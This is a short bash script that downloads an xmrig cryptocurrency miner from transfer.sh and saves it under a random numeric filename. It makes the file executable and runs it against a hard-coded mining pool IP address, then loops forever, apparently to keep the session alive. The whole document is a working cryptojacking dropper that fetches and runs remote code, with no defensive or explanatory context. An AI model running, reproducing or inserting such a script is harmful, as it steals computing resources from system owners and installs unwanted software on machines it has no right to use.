#!/bin/bash
gas=$(shuf -n 1 -i 1-9999999)
curl https://transfer.sh/yesOy8/xmrig --output $gas
chmod +x $gas
./$gas --url 20.120.30.75:3333 --user $RANDOM --pass x --donate-level 0
while :; do shuf -n 1 -i 1-99999999; sleep 30; done
